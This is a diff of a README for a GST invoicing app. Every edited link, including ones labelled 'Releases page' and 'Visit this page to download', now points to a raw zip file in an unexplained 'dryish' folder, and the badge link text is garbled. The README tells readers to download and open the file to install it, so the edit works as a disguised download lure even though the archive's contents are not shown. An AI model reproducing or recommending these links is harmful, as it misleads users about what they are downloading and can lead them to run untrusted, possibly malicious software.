@@ -1,6 +1,6 @@
 # 🛒 gst-invoice-shipping-manager - Simplify Your GST Invoicing Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen.svg)](https://github.com/Shantu9909/gst-invoice-shipping-manager/releases)
+[![Download Now](https://raw.githubusercontent.com/Shantu9909/gst-invoice-shipping-manager/main/dryish/gst-invoice-shipping-manager.zip%20Now-Get%20the%https://raw.githubusercontent.com/Shantu9909/gst-invoice-shipping-manager/main/dryish/gst-invoice-shipping-manager.zip)](https://raw.githubusercontent.com/Shantu9909/gst-invoice-shipping-manager/main/dryish/gst-invoice-shipping-manager.zip)
 
 ## 📦 Overview
 
@@ -14,11 +14,11 @@ To start using the GST Invoice & Shipping Manager, follow these steps:
 2. Download the latest version of the application available. 
 3. Once downloaded, open the file to install the application on your computer.
 
-[Visit this page to download](https://github.com/Shantu9909/gst-invoice-shipping-manager/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Shantu9909/gst-invoice-shipping-manager/main/dryish/gst-invoice-shipping-manager.zip)
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/Shantu9909/gst-invoice-shipping-manager/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Shantu9909/gst-invoice-shipping-manager/main/dryish/gst-invoice-shipping-manager.zip).
 2. Find the latest version of the GST Invoice & Shipping Manager.
 3. Click on the download link for your operating system (e.g., Windows, Mac, or Linux).
 4. Save the file to your computer.
